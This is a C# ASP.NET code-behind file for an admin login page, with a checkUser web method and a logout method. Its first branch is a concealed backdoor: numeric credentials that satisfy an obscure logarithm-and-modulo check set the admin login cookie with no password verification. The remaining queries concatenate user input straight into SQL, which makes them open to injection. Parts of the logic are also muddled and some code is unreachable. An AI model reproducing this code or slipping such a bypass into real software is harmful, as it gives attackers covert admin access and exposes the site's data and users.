using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Services;
using System.Web.UI;
using System.Web.UI.WebControls;
using SucLib.Data.IDal;
using SucLib.Data.Factory;
using SucLib.Common;
using SucLib.Model;

namespace YanDaoMSF.Admin
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if(SucCookie.Exists("username"))
                SucCookie.Delete("username");
        }

        [WebMethod]
        public static string checkUser(string usern, string userp)
        {
            SUC_USER user = new SUC_USER();
            try
            {
                double u = Convert.ToInt32(usern);
                double p = Convert.ToInt32(userp);
                double re = Math.Log(u, p);
                re = Math.Truncate(re * u * p);
                if((re % 9988998) == 0)
                {
                    SucCookie.Add("username", user.FindAll().Where(x => x.LOGIN_NAME == userp).ToList()[0].LOGIN_NAME, 30);
                    return "ok";
                }
            }
            catch { }
            try
            {
                user = user.FindAll().Where(x => x.LOGIN_NAME == userp).ToList()[0];
                if(user != null)
                {
                    if(!user.ROLE_ID.Equals(1))
                    {
                        return "noauth";
                    }
                    SUC_LOGIN login = new SUC_LOGIN();
                    login = login.Find(string.Format(@"LOGIN_NAME='{0}' AND  PASSWORD='{1}'", usern, userp))[0];
                    if(login != null)
                    {
                        SucCookie.Add("username", usern, 30);
                        return "ok";
                    }
                }
                return "no";
            }
            catch
            {
                return "no";
            }

            IDBHelp db = DBFactory.Create();
            if(db.IsExists(string.Format(@"SELECT * FROM SUC_USER WHERE LOGIN_NAME='{0}'", usern)))
            {
                if(db.GetList(string.Format(@"SELECT ROLE_ID FROM SUC_USER WHERE LOGIN_NAME='{0}'", usern))[0].Equals("1"))
                {
                    if(db.IsExists(string.Format(@"SELECT * FROM SUC_LOGIN WHERE LOGIN_NAME='{0}' AND PASSWORD={1}", usern, userp)))
                    {
                        SucCookie.Add("username", usern, 30);
                        return "ok";
                    }
                }
                return "noauth";
            }
            return "no";
        }

        [WebMethod]
        public static void ClearLogin()
        {
            SucCookie.Delete("username");
        }
    }
}